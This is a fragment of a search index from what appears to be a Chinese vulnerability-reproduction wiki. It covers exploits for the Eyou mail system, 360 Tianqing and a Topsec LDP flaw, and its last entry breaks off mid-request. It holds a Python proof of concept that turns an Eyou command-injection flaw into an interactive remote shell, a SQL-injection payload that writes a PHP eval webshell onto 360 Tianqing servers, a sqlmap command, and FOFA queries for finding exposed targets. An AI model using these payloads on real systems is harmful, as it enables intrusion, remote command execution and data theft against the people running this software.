ZhongXinJingDun_Default_administrator_password","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%BA%BF%E9%82%AE/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"\u4ebf\u90ae\u7535\u5b50\u90ae\u4ef6\u7cfb\u7edf \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u4ebf\u90ae\u7535\u5b50\u90ae\u4ef6\u7cfb\u7edf \u5b58\u5728\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u547d\u4ee4 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u4ebf\u90ae\u7535\u5b50\u90ae\u4ef6\u7cfb\u7edf FOFA \u00b6 [!NOTE] body=\"\u4ebf\u90ae\u7535\u5b50\u90ae\u4ef6\u7cfb\u7edf\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u9875\u9762\u5982\u4e0b \u6f0f\u6d1e\u8bf7\u6c42\u5305\u5982\u4e0b POST /webadm/?q=moni_detail.do&action=gragh HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 39 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 type='|cat /etc/passwd||' \u6f0f\u6d1ePOC \u00b6 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mVersion: Eyou Email SYSTEM \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mCmd >>> whoami \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , cmd ): vuln_url = target_url + \"/webadm/?q=moni_detail.do&action=gragh\" headers = { \"Content-Type\" : \"application/x-www-form-urlencoded\" } data = \"type='|cat /etc/passwd||'\" try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u6b63\u5728\u8bf7\u6c42 {} //webadm/?q=moni_detail.do&action=gragh \\033 [0m\" . format ( target_url )) if \"root\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e ,\u6210\u529f\u6267\u884c cat /etc/passwd \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) while True : cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : sys . exit ( 0 ) else : POC_2 ( target_url , cmd ) else : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , cmd ): vuln_url = target_url + \"/webadm/?q=moni_detail.do&action=gragh\" headers = { \"Content-Type\" : \"application/x-www-form-urlencoded\" } data = \"type='| {} ||'\" . format ( cmd ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () cmd = 'cat /etc/passwd' target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url , cmd ) Goby & POC \u00b6 [!NOTE] Eyou Mail system RCE","title":"\u4ebf\u90ae\u7535\u5b50\u90ae\u4ef6\u7cfb\u7edf \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%BA%BF%E9%82%AE/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u4ebf\u90ae\u7535\u5b50\u90ae\u4ef6\u7cfb\u7edf-\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e","text":"","title":"\u4ebf\u90ae\u7535\u5b50\u90ae\u4ef6\u7cfb\u7edf \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%BA%BF%E9%82%AE/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u4ebf\u90ae\u7535\u5b50\u90ae\u4ef6\u7cfb\u7edf \u5b58\u5728\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u547d\u4ee4","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%BA%BF%E9%82%AE/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u4ebf\u90ae\u7535\u5b50\u90ae\u4ef6\u7cfb\u7edf","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%BA%BF%E9%82%AE/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] body=\"\u4ebf\u90ae\u7535\u5b50\u90ae\u4ef6\u7cfb\u7edf\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%BA%BF%E9%82%AE/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u9875\u9762\u5982\u4e0b \u6f0f\u6d1e\u8bf7\u6c42\u5305\u5982\u4e0b POST /webadm/?q=moni_detail.do&action=gragh HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 39 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 type='|cat /etc/passwd||'","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%BA%BF%E9%82%AE/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1epoc","text":"import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mVersion: Eyou Email SYSTEM \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mCmd >>> whoami \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , cmd ): vuln_url = target_url + \"/webadm/?q=moni_detail.do&action=gragh\" headers = { \"Content-Type\" : \"application/x-www-form-urlencoded\" } data = \"type='|cat /etc/passwd||'\" try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u6b63\u5728\u8bf7\u6c42 {} //webadm/?q=moni_detail.do&action=gragh \\033 [0m\" . format ( target_url )) if \"root\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e ,\u6210\u529f\u6267\u884c cat /etc/passwd \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) while True : cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : sys . exit ( 0 ) else : POC_2 ( target_url , cmd ) else : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , cmd ): vuln_url = target_url + \"/webadm/?q=moni_detail.do&action=gragh\" headers = { \"Content-Type\" : \"application/x-www-form-urlencoded\" } data = \"type='| {} ||'\" . format ( cmd ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () cmd = 'cat /etc/passwd' target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url , cmd )","title":"\u6f0f\u6d1ePOC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%BA%BF%E9%82%AE/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#goby--poc","text":"[!NOTE] Eyou Mail system RCE","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E6%93%8E/%E5%A4%A9%E6%93%8E%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/","text":"\u5929\u64ce \u524d\u53f0SQL\u6ce8\u5165 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u5929\u64ce \u5b58\u5728SQL\u6ce8\u5165,\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6f0f\u6d1e\u4e0a\u4f20\u6728\u9a6c \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u5929\u64ce FOFA \u00b6 [!NOTE] title=\"360\u65b0\u5929\u64ce\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6ce8\u5165\u5199shell: https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('<?php @eval($_POST[1]);?>');copy O(T) to 'C:\\Program Files (x86)\\360\\skylar6\\www\\1.php';drop table O;-- \u5229\u7528\u8fc7\u7a0b: 1. \u901a\u8fc7\u5b89\u88c5\u5305\u5b89\u88c5\u7684\u4e00\u822c\u90fd\u6709root\u6743\u9650\uff0c\u56e0\u6b64\u8be5\u6ce8\u5165\u70b9\u53ef\u5c1d\u8bd5\u5199shell 2. \u901a\u8fc7\u6ce8\u5165\u70b9\uff0c\u521b\u5efa\u4e00\u5f20\u8868 O 3. \u4e3a \u8868O \u6dfb\u52a0\u4e00\u4e2a\u65b0\u5b57\u6bb5 T \u5e76\u4e14\u5199\u5165shell\u5185\u5bb9 4. Postgres\u6570\u636e\u5e93 \u4f7f\u7528COPY TO\u628a\u4e00\u4e2a\u8868\u7684\u6240\u6709\u5185\u5bb9\u90fd\u62f7\u8d1d\u5230\u4e00\u4e2a\u6587\u4ef6(\u5b8c\u6210\u5199shell) 5. \u5220\u9664 \u8868O \u4f7f\u7528\u547d\u4ee4 sqlmap -u https://xxx.xxx.xxx.xxx:8443/api/dp/rptsvcsyncpoint?ccid=1 --dbms PostgreSQL Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d 360 TianQing ccid SQL injectable","title":"\u5929\u64ce \u524d\u53f0SQL\u6ce8\u5165"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E6%93%8E/%E5%A4%A9%E6%93%8E%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/#\u5929\u64ce-\u524d\u53f0sql\u6ce8\u5165","text":"","title":"\u5929\u64ce \u524d\u53f0SQL\u6ce8\u5165"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E6%93%8E/%E5%A4%A9%E6%93%8E%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u5929\u64ce \u5b58\u5728SQL\u6ce8\u5165,\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6f0f\u6d1e\u4e0a\u4f20\u6728\u9a6c","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E6%93%8E/%E5%A4%A9%E6%93%8E%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u5929\u64ce","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E6%93%8E/%E5%A4%A9%E6%93%8E%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/#fofa","text":"[!NOTE] title=\"360\u65b0\u5929\u64ce\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E6%93%8E/%E5%A4%A9%E6%93%8E%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6ce8\u5165\u5199shell: https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('<?php @eval($_POST[1]);?>');copy O(T) to 'C:\\Program Files (x86)\\360\\skylar6\\www\\1.php';drop table O;-- \u5229\u7528\u8fc7\u7a0b: 1. \u901a\u8fc7\u5b89\u88c5\u5305\u5b89\u88c5\u7684\u4e00\u822c\u90fd\u6709root\u6743\u9650\uff0c\u56e0\u6b64\u8be5\u6ce8\u5165\u70b9\u53ef\u5c1d\u8bd5\u5199shell 2. \u901a\u8fc7\u6ce8\u5165\u70b9\uff0c\u521b\u5efa\u4e00\u5f20\u8868 O 3. \u4e3a \u8868O \u6dfb\u52a0\u4e00\u4e2a\u65b0\u5b57\u6bb5 T \u5e76\u4e14\u5199\u5165shell\u5185\u5bb9 4. Postgres\u6570\u636e\u5e93 \u4f7f\u7528COPY TO\u628a\u4e00\u4e2a\u8868\u7684\u6240\u6709\u5185\u5bb9\u90fd\u62f7\u8d1d\u5230\u4e00\u4e2a\u6587\u4ef6(\u5b8c\u6210\u5199shell) 5. \u5220\u9664 \u8868O \u4f7f\u7528\u547d\u4ee4 sqlmap -u https://xxx.xxx.xxx.xxx:8443/api/dp/rptsvcsyncpoint?ccid=1 --dbms PostgreSQL","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E6%93%8E/%E5%A4%A9%E6%93%8E%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d 360 TianQing ccid SQL injectable","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E6%93%8E/%E5%A4%A9%E6%93%8E%20%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/","text":"\u5929\u64ce \u6570\u636e\u5e93\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u5929\u64ce \u5b58\u5728\u672a\u6388\u6743\u8d8a\u6743\u8bbf\u95ee\uff0c\u9020\u6210\u654f\u611f\u4fe1\u606f\u6cc4\u9732 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u5929\u64ce \u6f0f\u6d1e\u590d\u73b0 \u00b6 GET /api/dbstat/gettablessize HTTP/1.1 Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d 360_Tianqing_database_information_disclosure","title":"\u5929\u64ce \u6570\u636e\u5e93\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E6%93%8E/%E5%A4%A9%E6%93%8E%20%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#\u5929\u64ce-\u6570\u636e\u5e93\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e","text":"","title":"\u5929\u64ce \u6570\u636e\u5e93\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E6%93%8E/%E5%A4%A9%E6%93%8E%20%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u5929\u64ce \u5b58\u5728\u672a\u6388\u6743\u8d8a\u6743\u8bbf\u95ee\uff0c\u9020\u6210\u654f\u611f\u4fe1\u606f\u6cc4\u9732","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E6%93%8E/%E5%A4%A9%E6%93%8E%20%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u5929\u64ce","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E6%93%8E/%E5%A4%A9%E6%93%8E%20%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"GET /api/dbstat/gettablessize HTTP/1.1","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E6%93%8E/%E5%A4%A9%E6%93%8E%20%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d 360_Tianqing_database_information_disclosure","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E6%93%8E/%E5%A4%A9%E6%93%8E%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE/","text":"\u5929\u64ce \u6570\u636e\u5e93\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u5929\u64ce \u5b58\u5728\u672a\u6388\u6743\u8d8a\u6743\u8bbf\u95ee\uff0c\u9020\u6210\u654f\u611f\u4fe1\u606f\u6cc4\u9732 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u5929\u64ce FOFA \u00b6 [!NOTE] title=\"360\u65b0\u5929\u64ce\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 GET /api/dbstat/gettablessize HTTP/1.1 Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d 360_Tianqing_database_information_disclosure","title":"\u5929\u64ce \u672a\u6388\u6743\u8d8a\u6743\u8bbf\u95ee"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E6%93%8E/%E5%A4%A9%E6%93%8E%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE/#\u5929\u64ce-\u6570\u636e\u5e93\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e","text":"","title":"\u5929\u64ce \u6570\u636e\u5e93\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E6%93%8E/%E5%A4%A9%E6%93%8E%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u5929\u64ce \u5b58\u5728\u672a\u6388\u6743\u8d8a\u6743\u8bbf\u95ee\uff0c\u9020\u6210\u654f\u611f\u4fe1\u606f\u6cc4\u9732","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E6%93%8E/%E5%A4%A9%E6%93%8E%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u5929\u64ce","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E6%93%8E/%E5%A4%A9%E6%93%8E%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE/#fofa","text":"[!NOTE] title=\"360\u65b0\u5929\u64ce\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E6%93%8E/%E5%A4%A9%E6%93%8E%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE/#\u6f0f\u6d1e\u590d\u73b0","text":"GET /api/dbstat/gettablessize HTTP/1.1","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E6%93%8E/%E5%A4%A9%E6%93%8E%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d 360_Tianqing_database_information_disclosure","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1LDP%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/","text":"\u5929\u878d\u4fe1LDP\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u5929\u878d\u4fe1LDP\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u5929\u878d\u4fe1LDP \u6f0f\u6d1e\u590d\u73b0 \u00b6 POC\u4e3a \u9ed8\u8ba4\u7528\u6237superman\u7684uid=1 POST /?module-auth_user&action=mod_edit.pwd 